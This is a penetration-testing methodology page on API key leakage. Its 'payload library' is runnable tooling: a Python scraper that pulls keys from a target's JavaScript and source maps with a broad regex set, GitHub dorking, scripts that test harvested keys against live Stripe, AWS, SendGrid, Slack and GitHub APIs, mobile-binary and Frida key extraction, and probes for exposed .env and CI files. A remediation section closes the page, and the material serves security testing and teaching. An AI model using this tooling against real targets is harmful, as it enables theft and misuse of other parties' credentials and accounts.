---
title: "API Key Leakage"
date: 2026-02-24
draft: false
---

# API Key Leakage

> **Severity**: High–Critical | **CWE**: CWE-312, CWE-200, CWE-522
> **OWASP**: A02:2021 – Cryptographic Failures | A09:2021 – Security Logging Failures

---

## What Is API Key Leakage?

API keys, tokens, secrets, and credentials exposed through unintended channels — JavaScript bundles, git history, HTTP responses, mobile app binaries, environment variables in public CI logs, and configuration files. Unlike authentication token theft, API key leakage is passive: the credential is simply read from a public source.

Key distinction: API keys often have broader or different privileges than user session tokens — they may provide direct access to third-party services (AWS, Stripe, Twilio, SendGrid, Google Maps) without any session or CSRF protection.

```
Common leakage sources:
  JS bundle:     window.STRIPE_KEY = "sk_live_XXXX"  ← live secret key
  .env in git:   AWS_SECRET_ACCESS_KEY=XXXX committed to public repo
  CI logs:       Printed during test run: export SLACK_TOKEN=xoxb-...
  HTTP response: {"debug":{"database_url":"postgres://user:pass@host/db"}}
  APK resource:  api_key="AIzaSy..." in res/values/strings.xml
  Referrer:      https://api.service.com?key=LIVE_KEY_IN_URL
```

---

## Discovery Checklist

**Phase 1 — JavaScript Bundle Analysis**
- [ ] Download all JS files from target application
- [ ] Search for common key patterns: `sk_live_`, `pk_live_`, `AIzaSy`, `AKIA`, `xoxb-`, `SG.`, `ghp_`, `glpat-`
- [ ] Look for environment variable patterns: `process.env.`, `window.__env__`, `config.apiKey`
- [ ] Check source maps (`.js.map`) — full source exposure
- [ ] Check minified code for hardcoded string patterns

**Phase 2 — Version Control History**
- [ ] Search public GitHub repos: `org:target` or `target.com`
- [ ] Search git history of any open-source components used by target
- [ ] Check `.env`, `.env.example`, `config.js`, `settings.py`, `application.properties` in repos
- [ ] Search commit messages for "credentials", "keys", "secret", "token"

**Phase 3 — Response Analysis**
- [ ] Check API error responses for internal service URLs with embedded credentials
- [ ] Check debug mode responses: `/api?debug=true`, Actuator `/env`
- [ ] Check HTTP response headers for leaked tokens
- [ ] Check `Referer` header leakage if keys are in URLs

---

## Payload Library

### Payload 1 — JavaScript Bundle Secret Extraction

```python
#!/usr/bin/env python3
"""
Extract API keys and secrets from JavaScript bundles
"""
import re, requests, sys
from urllib.parse import urljoin

TARGET = "https://target.com"

# Common API key patterns:
PATTERNS = {
    # Generic:
    "Generic High-Entropy": r'["\']([A-Za-z0-9_\-]{32,64})["\']',
    # AWS:
    "AWS Access Key ID": r'AKIA[0-9A-Z]{16}',
    "AWS Secret Key": r'["\']([0-9a-zA-Z/+]{40})["\']',  # context-dependent
    # Stripe:
    "Stripe Secret Key": r'sk_live_[0-9a-zA-Z]{24,}',
    "Stripe Publishable Key": r'pk_live_[0-9a-zA-Z]{24,}',
    # Google:
    "Google API Key": r'AIzaSy[0-9A-Za-z\-_]{33}',
    "Google OAuth": r'[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com',
    # Slack:
    "Slack Bot Token": r'xoxb-[0-9]{11}-[0-9]{11}-[0-9a-zA-Z]{24}',
    "Slack User Token": r'xoxp-[0-9]{11}-[0-9]{11}-[0-9]{11}-[0-9a-f]{32}',
    "Slack Webhook": r'https://hooks\.slack\.com/services/T[a-zA-Z0-9_]{8}/B[a-zA-Z0-9_]{8}/[a-zA-Z0-9_]{24}',
    # SendGrid:
    "SendGrid API Key": r'SG\.[a-zA-Z0-9_\-]{22}\.[a-zA-Z0-9_\-]{43}',
    # GitHub:
    "GitHub Token": r'ghp_[0-9a-zA-Z]{36}',
    "GitHub App Token": r'ghs_[0-9a-zA-Z]{36}',
    "GitHub OAuth Token": r'gho_[0-9a-zA-Z]{36}',
    # GitLab:
    "GitLab Token": r'glpat-[0-9a-zA-Z\-_]{20}',
    # Twilio:
    "Twilio Account SID": r'AC[a-zA-Z0-9]{32}',
    "Twilio Auth Token": r'SK[a-zA-Z0-9]{32}',
    # Firebase:
    "Firebase": r'AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}',
    # Mapbox:
    "Mapbox Token": r'pk\.eyJ1Ijoi[A-Za-z0-9_-]{50,}',
    # Mailchimp:
    "Mailchimp API Key": r'[0-9a-f]{32}-us[0-9]{1,2}',
    # Generic Passwords:
    "Password in Config": r'(?:password|passwd|pwd|secret|token|api_key|apikey|access_key)\s*[:=]\s*["\']([^"\']{8,})["\']',
    "Connection String": r'(?:mongodb|mysql|postgres|postgresql|redis|mssql|sqlserver)://[^\s"\'<>]{10,}',
    "Bearer Token": r'Bearer\s+[A-Za-z0-9\-._~+/]{20,}={0,2}',
    # Private Keys:
    "RSA Private Key": r'-----BEGIN RSA PRIVATE KEY-----',
    "Private Key": r'-----BEGIN PRIVATE KEY-----',
    "PEM Certificate": r'-----BEGIN CERTIFICATE-----',
}

def get_js_files(base_url):
    """Extract all JS file URLs from homepage"""
    r = requests.get(base_url, timeout=10)
    js_urls = re.findall(r'(?:src)=["\']([^"\']*\.js[^"\']*)["\']', r.text)
    return [urljoin(base_url, url) for url in js_urls]

def scan_content(content, source):
    """Scan text content for API key patterns"""
    findings = []
    for name, pattern in PATTERNS.items():
        matches = re.findall(pattern, content)
        for match in matches:
            if isinstance(match, tuple):
                match = match[0]  # Take first group
            # Filter out obvious false positives:
            if len(match) < 8 or match in ['undefined', 'null', 'true', 'false']:
                continue
            findings.append((name, match, source))
    return findings

# Scan main page:
r = requests.get(TARGET, timeout=10)
findings = scan_content(r.text, TARGET)

# Scan JS files:
js_files = get_js_files(TARGET)
for js_url in js_files[:20]:  # Limit to first 20
    try:
        js = requests.get(js_url, timeout=10).text
        findings.extend(scan_content(js, js_url))
    except: pass

# Check source maps:
for js_url in js_files[:5]:
    map_url = js_url + ".map"
    try:
        r = requests.get(map_url, timeout=5)
        if r.status_code == 200:
            findings.extend(scan_content(r.text, f"[SOURCEMAP] {map_url}"))
    except: pass

# Display results:
seen = set()
for name, value, source in findings:
    key = (name, value[:20])
    if key not in seen:
        seen.add(key)
        print(f"\n[!!!] {name}")
        print(f"  Value: {value[:80]}{'...' if len(value) > 80 else ''}")
        print(f"  Found in: {source[:100]}")
```

### Payload 2 — GitHub Dorking for Leaked Credentials

```bash
# GitHub search for API keys belonging to target:
# Searches (via GitHub.com search or GitHub API):

# 1. Search by company name + key patterns:
# site:github.com "target.com" "api_key" OR "secret" OR "password"
# site:github.com "target.com" "sk_live_" OR "AKIA" OR "SG."

# GitHub API search (requires GitHub token):
python3 << 'EOF'
import requests, time

GH_TOKEN = "YOUR_GITHUB_TOKEN"
HEADERS = {"Authorization": f"token {GH_TOKEN}",
           "Accept": "application/vnd.github.v3.text-match+json"}

search_queries = [
    'target.com password filename:.env',
    'target.com apikey filename:config',
    'target.com secret_key extension:py',
    'target.com AKIA language:js',
    'sk_live_ target.com',
    '"https://api.target.com" Authorization',
    'target.com db_password extension:properties',
]

for query in search_queries:
    url = f"https://api.github.com/search/code?q={requests.utils.quote(query)}&per_page=5"
    r = requests.get(url, headers=HEADERS)
    if r.status_code == 200:
        results = r.json()
        total = results.get('total_count', 0)
        if total > 0:
            print(f"\n[{total} results] {query}")
            for item in results.get('items', [])[:3]:
                print(f"  {item['html_url']}")
    time.sleep(10)  # GitHub rate limiting
EOF

# truffleHog — scan repos for secrets:
pip3 install trufflehog
trufflehog github --org TARGET_ORG --only-verified
trufflehog github --repo https://github.com/target/repo --only-verified
trufflehog git file://. --only-verified  # local repo

# gitleaks — scan git history:
gitleaks detect --source=. -v
gitleaks detect --source=. --log-opts="--all" -v  # full history including deleted commits

# Scan specific repo git history:
git clone https://github.com/target/public-repo
cd public-repo
gitleaks detect -v

# Also check deleted branches, force-pushed commits:
git log --all --oneline | head -50
git diff HEAD~10 HEAD  # look at recent large changes
```

### Payload 3 — Validate and Test Found Keys

```python
#!/usr/bin/env python3
"""
Validate discovered API keys against their respective APIs
"""
import requests

def validate_aws(access_key, secret_key):
    """Test AWS credentials using GetCallerIdentity"""
    import hmac, hashlib, datetime
    # Use boto3 for simplicity:
    try:
        import boto3
        from botocore.exceptions import ClientError, NoCredentialsError
        client = boto3.client('sts',
            aws_access_key_id=access_key,
            aws_secret_access_key=secret_key,
            region_name='us-east-1')
        identity = client.get_caller_identity()
        print(f"[!!!] VALID AWS KEY!")
        print(f"  Account: {identity['Account']}")
        print(f"  UserID: {identity['UserId']}")
        print(f"  ARN: {identity['Arn']}")
        return True
    except Exception as e:
        print(f"[ ] AWS key invalid: {str(e)[:100]}")
        return False

def validate_stripe(key):
    """Test Stripe API key"""
    r = requests.get("https://api.stripe.com/v1/charges?limit=1",
                     auth=(key, ""))
    if r.status_code == 200:
        print(f"[!!!] VALID STRIPE KEY: {key[:15]}...")
        data = r.json()
        print(f"  Charges accessible: {len(data.get('data', []))}")
        return True
    else:
        print(f"[ ] Stripe key invalid: {r.status_code}")
        return False

def validate_sendgrid(key):
    """Test SendGrid API key"""
    r = requests.get("https://api.sendgrid.com/v3/user/profile",
                     headers={"Authorization": f"Bearer {key}"})
    if r.status_code == 200:
        profile = r.json()
        print(f"[!!!] VALID SENDGRID KEY!")
        print(f"  Email: {profile.get('email')}")
        print(f"  Account: {profile.get('company')}")
        return True
    print(f"[ ] SendGrid key invalid: {r.status_code}")
    return False

def validate_slack(token):
    """Test Slack token"""
    r = requests.post("https://slack.com/api/auth.test",
                      headers={"Authorization": f"Bearer {token}"})
    data = r.json()
    if data.get("ok"):
        print(f"[!!!] VALID SLACK TOKEN!")
        print(f"  Team: {data.get('team')}")
        print(f"  User: {data.get('user')}")
        return True
    print(f"[ ] Slack token invalid: {data.get('error')}")
    return False

def validate_github(token):
    """Test GitHub token"""
    r = requests.get("https://api.github.com/user",
                     headers={"Authorization": f"token {token}"})
    if r.status_code == 200:
        data = r.json()
        print(f"[!!!] VALID GITHUB TOKEN!")
        print(f"  User: {data.get('login')}")
        print(f"  Name: {data.get('name')}")
        # Check scopes:
        scopes = r.headers.get('X-OAuth-Scopes', 'unknown')
        print(f"  Scopes: {scopes}")
        return True
    print(f"[ ] GitHub token invalid: {r.status_code}")
    return False

def validate_google_maps(key):
    """Test Google Maps API key"""
    r = requests.get(f"https://maps.googleapis.com/maps/api/geocode/json?address=1600+Amphitheatre+Parkway&key={key}")
    data = r.json()
    if data.get("status") == "OK":
        print(f"[!!!] VALID GOOGLE MAPS KEY: {key[:20]}...")
        return True
    elif data.get("status") == "REQUEST_DENIED":
        print(f"[ ] Google Maps key: REQUEST_DENIED (may be IP-restricted)")
    return False

def validate_firebase(key):
    """Test Firebase/GCM push notification key"""
    r = requests.post("https://fcm.googleapis.com/fcm/send",
                      headers={"Authorization": f"key={key}",
                               "Content-Type": "application/json"},
                      json={"to": "INVALID_TOKEN_FOR_TESTING"})
    if r.status_code != 401:
        print(f"[!!!] POSSIBLE VALID FIREBASE KEY: {r.status_code} → {r.text[:100]}")
        return True
    print(f"[ ] Firebase key: UNAUTHORIZED")
    return False

# Test found keys:
found_keys = {
    "aws_access": "AKIA...",
    "aws_secret": "...",
    "stripe_key": "sk_live_...",
    "sendgrid": "SG....",
    "slack": "xoxb-...",
    "github": "ghp_...",
    "google_maps": "AIzaSy...",
}

print("[*] Validating discovered keys...")
validate_aws(found_keys["aws_access"], found_keys["aws_secret"])
validate_stripe(found_keys["stripe_key"])
validate_sendgrid(found_keys["sendgrid"])
validate_slack(found_keys["slack"])
validate_github(found_keys["github"])
validate_google_maps(found_keys["google_maps"])
```

### Payload 4 — Mobile App Binary Key Extraction

```bash
# Android APK:
apktool d target.apk -o target_decoded/

# Search for API key patterns:
grep -rE 'AIzaSy[0-9A-Za-z_-]{33}|AKIA[0-9A-Z]{16}|sk_live_[0-9a-z]{24}' \
  target_decoded/ --include="*.xml" --include="*.json" --include="*.properties"

# String resources (common place for keys):
cat target_decoded/res/values/strings.xml | grep -i "key\|token\|secret\|api"

# gradle.properties / local.properties:
find target_decoded -name "*.properties" -exec grep -H "key\|token\|secret" {} \;

# Smali code search:
grep -r "const-string" target_decoded/smali/ | \
  grep -iE 'AKIA|sk_live|AIzaSy|SG\.' | head -20

# iOS IPA:
unzip target.ipa -d target_ipa/
strings target_ipa/Payload/App.app/App | \
  grep -E 'AKIA|sk_live|AIzaSy|SG\.|xoxb-|ghp_' | sort -u

# Search plist files:
find target_ipa -name "*.plist" -exec plutil -p {} \; 2>/dev/null | \
  grep -iE 'key|token|secret|password|api'

# Frida — extract keys from memory at runtime:
frida -U -l - com.target.app << 'EOF'
// Hook common key storage methods:
Java.perform(function() {
    // SharedPreferences:
    var sp = Java.use("android.content.SharedPreferences$Editor");
    sp.putString.implementation = function(key, value) {
        if (value && value.length > 10) {
            console.log("[SharedPrefs] " + key + " = " + value.substring(0, 80));
        }
        return this.putString(key, value);
    };
});
EOF
```

### Payload 5 — CI/CD and Cloud Provider Log Scanning

```bash
# Check public CI logs for leaked secrets:
# GitHub Actions logs are public for public repos

# Check Travis CI public builds:
curl -s "https://api.travis-ci.org/repos/target_org/target_repo/builds" \
  -H "Travis-API-Version: 3" | python3 -c "
import sys, json
builds = json.load(sys.stdin)
for build in builds.get('builds', [])[:5]:
    print(build.get('id'), build.get('state'), build.get('started_at'))
"
# Then: check build logs for printed environment variables

# Wayback Machine for leaked CI config files:
curl -s "http://web.archive.org/cdx/search/cdx?url=target.com/.travis.yml&output=json&fl=original,timestamp" | \
  python3 -m json.tool

# Common exposed CI config files:
for path in ".travis.yml" ".circleci/config.yml" "Jenkinsfile" ".github/workflows" \
  "bitbucket-pipelines.yml" ".gitlab-ci.yml" "azure-pipelines.yml"; do
  status=$(curl -s -o /tmp/ci_file -w "%{http_code}" "https://target.com/$path")
  [ "$status" = "200" ] && echo "[!!!] CI config exposed: $path" && cat /tmp/ci_file | \
    grep -iE 'secret|token|password|key|cred'
done

# Check package.json, pyproject.toml, etc. for embedded keys:
curl -s "https://target.com/package.json" | \
  python3 -m json.tool 2>/dev/null | grep -i "key\|token\|secret"

# .env files in common locations:
for envfile in ".env" ".env.production" ".env.local" ".env.example" \
  "config/.env" "backend/.env" "api/.env" "server/.env"; do
  status=$(curl -s -o /tmp/env_file -w "%{http_code}" "https://target.com/$envfile")
  [ "$status" = "200" ] && echo "[!!!] .env exposed: $envfile" && \
    grep -v "^#" /tmp/env_file | grep "=" | grep -v "^$"
done
```

---

## Tools

```bash
# truffleHog — comprehensive secret scanner:
pip3 install trufflehog
trufflehog github --org TARGET_ORG --only-verified --concurrency=5
trufflehog git https://github.com/target/repo

# gitleaks — git history secret scanner:
gitleaks detect --source=/path/to/repo -v --report-format json -o leaks.json
gitleaks detect --source=. --log-opts="--all --full-history" -v

# detect-secrets — baseline secret detection:
pip3 install detect-secrets
detect-secrets scan . > .secrets.baseline

# semgrep — custom pattern matching for secrets:
semgrep --config=auto . --include="*.js" --include="*.ts" --include="*.py"

# nuclei — secret detection templates:
nuclei -target https://target.com -t exposures/tokens/ -t exposures/configs/

# gitrob — GitHub organization secret scanner:
gitrob analyze TARGET_ORG

# Extract secrets from JS with jsluice:
go install github.com/BishopFox/jsluice/cmd/jsluice@latest
curl -s https://target.com/static/app.js | jsluice secrets

# AWS key permission enumeration (after finding AKIA key):
# aws-whoami:
pip3 install aws-enumerate
aws sts get-caller-identity --access-key-id AKIA... --secret-access-key ...

# Enumerate AWS permissions:
git clone https://github.com/andresriancho/enumerate-iam
python3 enumerate_iam.py --access-key AKIA... --secret-key ...

# Google API key scope tester:
# Test which APIs the leaked key can access:
for api in "maps.googleapis.com/maps/api/geocode/json?address=test" \
  "www.googleapis.com/oauth2/v1/userinfo" \
  "www.googleapis.com/calendar/v3/calendars/primary"; do
  r=$(curl -s "https://$api&key=FOUND_KEY" -w "\n%{http_code}")
  echo "$api → $(echo $r | tail -1)"
done
```

---

## Remediation Reference

- **Never hardcode secrets**: use environment variables, secrets managers (AWS Secrets Manager, HashiCorp Vault, GCP Secret Manager), or runtime injection — never store secrets in source code
- **Pre-commit hooks**: install `gitleaks` or `detect-secrets` as git pre-commit hooks — block commits containing secret patterns
- **Rotate immediately on discovery**: treat any leaked API key as fully compromised — revoke and rotate immediately, then audit logs for unauthorized usage
- **Secrets in frontend are public**: anything in JavaScript that runs in the browser is publicly readable — use server-side API calls for sensitive operations, expose only public/scoped keys to frontend
- **Source maps**: do not serve `.js.map` files in production — they expose full source including any hardcoded values
- **Environment separation**: use different API keys for development, staging, and production — a leaked dev key should not grant production access
- **Key scoping**: use the minimum-privilege key for each use case — read-only keys for read-only operations; webhook signing keys separate from admin keys
- **Monitor for key usage**: AWS CloudTrail, Stripe Dashboard, GitHub audit log — alert on unusual geographic location, volume, or API operations for any API key

*Part of the Web Application Penetration Testing Methodology series.*
